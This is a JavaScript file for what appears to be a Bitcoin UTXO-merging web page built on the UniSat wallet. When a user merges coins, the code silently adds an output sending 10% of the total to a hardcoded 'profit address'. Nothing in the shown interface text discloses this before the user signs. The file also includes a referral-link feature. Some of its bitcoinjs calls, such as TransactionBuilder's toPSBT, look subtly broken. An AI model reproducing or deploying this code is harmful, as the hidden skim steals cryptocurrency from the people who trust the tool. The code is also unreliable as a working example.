// 确保引入 bitcoinjs-lib（需要在页面中引入，或者通过模块加载）
console.log('Script.js version: 2025-03-31-v4');
const Bitcoin = window.bitcoinjs || {}; // 如果通过 <script> 引入

document.addEventListener('DOMContentLoaded', async () => {
    // 使用状态对象管理 walletProvider 和 walletAddress
    const state = {
        walletProvider: null,
        walletAddress: null,
        targetAddress: null,
        profitAddress: '15Kh1QUbZg9cT9UXvtABjg12RCPmzbNLpd', // 你的收益地址
        profitRate: 0.1 // 10% 收益
    };
    // 保护 state 对象，防止意外修改
    Object.seal(state);

    const connectButton = document.getElementById('connect-wallet');
    const disconnectButton = document.getElementById('disconnect-wallet');
    const walletStatus = document.getElementById('wallet-status');
    const mergeButton = document.getElementById('merge-utxo');
    const targetAddressInput = document.getElementById('target-address');
    const feeRateInput = document.getElementById('custom-fee-rate');
    const feeRatesDisplay = document.getElementById('fee-rates');

    // 改进的 fetch 方法，处理非 JSON 响应
    async function fetchWithErrorHandling(url, options) {
        console.log('fetchWithErrorHandling 调用，当前 walletProvider:', state.walletProvider);
        const response = await fetch(url, options);
        if (!response.ok) {
            const text = await response.text();
            throw new Error(`HTTP 错误: ${response.status}, 响应: ${text}`);
        }
        const contentType = response.headers.get('content-type');
        if (!contentType || !contentType.includes('application/json')) {
            const text = await response.text();
            throw new Error(`预期 JSON 响应，但收到: ${text}`);
        }
        return response.json();
    }

    // 加载主网费率
    async function loadFeeRates() {
        try {
            console.log('loadFeeRates 调用，当前 walletProvider:', state.walletProvider);
            const data = await fetchWithErrorHandling('/get-fee-rates');
            if (data.error) {
                throw new Error(data.error);
            }
            feeRatesDisplay.textContent = `快速: ${data.fastestFee}, 中等: ${data.halfHourFee}, 慢速: ${data.hourFee}`;
        } catch (error) {
            console.error('加载费率失败:', error);
            feeRatesDisplay.textContent = '无法加载费率';
        }
    }

    // 检测钱包是否可用（添加延迟重试机制和调试日志）
    async function waitForWallet(walletType, maxRetries = 5, delay = 1000) {
        console.log(`开始检测 ${walletType} 钱包...`);
        for (let i = 0; i < maxRetries; i++) {
            if (walletType === 'unisat' && window.unisat) {
                console.log('UniSat 钱包已加载');
                return window.unisat;
            }
            await new Promise(resolve => setTimeout(resolve, delay));
        }
        throw new Error('UniSat 钱包未加载，请确保扩展已安装并启用。');
    }

    // 显示钱包选择弹窗（只支持 UniSat）
    function showWalletOptions() {
        const walletOptions = `
            <div id="wallet-modal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center;">
                <div style="background: white; padding: 20px; border-radius: 10px; text-align: center;">
                    <h3>选择钱包</h3>
                    <button id="unisat-wallet">UniSat</button>
                    <button id="cancel-wallet">取消</button>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', walletOptions);

        // 动态绑定事件
        document.getElementById('unisat-wallet').addEventListener('click', () => connectWallet('unisat'));
        document.getElementById('cancel-wallet').addEventListener('click', () => {
            document.getElementById('wallet-modal').remove();
        });
    }

    // 连接钱包（只支持 UniSat）
    async function connectWallet(walletType) {
        try {
            // 重置状态
            state.walletProvider = null;
            state.walletAddress = null;
            console.log('连接钱包，walletType:', walletType, '当前 walletProvider:', state.walletProvider);

            if (walletType === 'unisat') {
                const unisat = await waitForWallet('unisat');
                const accounts = await unisat.requestAccounts();
                state.walletProvider = 'unisat';
                state.walletAddress = accounts[0];
                console.log('UniSat 钱包连接成功，walletProvider:', state.walletProvider, 'walletAddress:', state.walletAddress);
            } else {
                throw new Error('目前仅支持 UniSat 钱包');
            }
            walletStatus.textContent = `已连接钱包: ${state.walletAddress}`;
            connectButton.style.display = 'none';
            disconnectButton.style.display = 'inline';
            mergeButton.disabled = false;
            document.getElementById('wallet-modal').remove();
        } catch (error) {
            console.error('连接钱包失败:', error);
            walletStatus.textContent = '连接钱包失败: ' + error.message;
            document.getElementById('wallet-modal').remove();
            state.walletProvider = null;
            state.walletAddress = null;
        }
    }

    // 绑定“链接钱包”按钮事件
    if (connectButton) {
        connectButton.addEventListener('click', showWalletOptions);
    } else {
        console.error('未找到 connect-wallet 按钮');
    }

    // 断开连接
    if (disconnectButton) {
        disconnectButton.addEventListener('click', () => {
            state.walletProvider = null;
            state.walletAddress = null;
            walletStatus.textContent = '未连接钱包';
            connectButton.style.display = 'inline';
            disconnectButton.style.display = 'none';
            mergeButton.disabled = true;
            console.log('钱包已断开连接，walletProvider:', state.walletProvider, 'walletAddress:', state.walletAddress);
        });
    }

    // 合并 UTXO 并转账
    if (mergeButton) {
        mergeButton.addEventListener('click', async () => {
            state.targetAddress = targetAddressInput.value.trim() || state.walletAddress;
            const feeRate = parseInt(feeRateInput.value) || 10;

            try {
                console.log('开始合并 UTXO，当前 walletProvider:', state.walletProvider);
                if (!state.walletProvider || !state.walletAddress) {
                    throw new Error('未连接钱包，请先连接钱包');
                }

                // 获取 UTXO
                console.log('获取 UTXO，当前 walletProvider:', state.walletProvider);
                const utxoData = await fetchWithErrorHandling('/get-utxos', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: state.walletAddress })
                });
                const { utxos } = utxoData;
                if (!utxos || utxos.length < 2) throw new Error('至少需要2个UTXO');

                // 构造交易
                const network = Bitcoin.networks.bitcoin; // 主网
                const txb = new Bitcoin.TransactionBuilder(network);
                let totalInput = 0;
                utxos.forEach(utxo => {
                    txb.addInput(utxo.txid, utxo.vout);
                    totalInput += utxo.value;
                });

                const txSize = utxos.length * 148 + 34 + 10;
                const fee = txSize * feeRate;
                const profit = Math.floor(totalInput * state.profitRate); // 10% 收益
                const outputValue = totalInput - fee - profit;

                if (outputValue <= 0) throw new Error('余额不足以支付费用和收益');

                // 输出：用户目标地址和你的收益地址
                txb.addOutput(state.targetAddress, outputValue);
                txb.addOutput(state.profitAddress, profit);

                const psbt = txb.buildIncomplete().toPSBT();

                // 签名（只支持 UniSat）
                console.log('准备签名，当前 walletProvider:', state.walletProvider);
                let signedTxHex;
                if (state.walletProvider !== 'unisat') {
                    console.error('无效的 walletProvider:', state.walletProvider);
                    throw new Error('目前仅支持 UniSat 钱包，请重新连接钱包');
                }
                console.log('使用 UniSat 钱包签名...');
                const unisat = await waitForWallet('unisat');
                signedTxHex = await unisat.signPsbt(psbt.toHex());

                // 广播交易
                console.log('广播交易，当前 walletProvider:', state.walletProvider);
                const broadcastData = await fetchWithErrorHandling('/broadcast', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ txHex: signedTxHex })
                });
                const { txId } = broadcastData;

                document.location.href = `/?message=UTXO合并并转账成功！&txId=${txId}`;
            } catch (error) {
                console.error('合并 UTXO 失败:', error);
                alert(`合并 UTXO 失败: ${error.message}`);
            }
        });
    }

    // 邀请朋友
    const inviteFriendsButton = document.getElementById('invite-friends');
    if (inviteFriendsButton) {
        inviteFriendsButton.addEventListener('click', () => {
            if (!state.walletAddress) {
                alert('请先链接钱包！');
                return;
            }
            const inviteUrl = `${window.location.origin}/?ref=${state.walletAddress}`;
            const inviteLinkDiv = document.getElementById('invite-link');
            const inviteUrlElement = document.getElementById('invite-url');
            inviteUrlElement.href = inviteUrl;
            inviteUrlElement.textContent = inviteUrl;
            inviteLinkDiv.style.display = 'block';
        });
    }

    // 页面加载时加载费率
    loadFeeRates();
});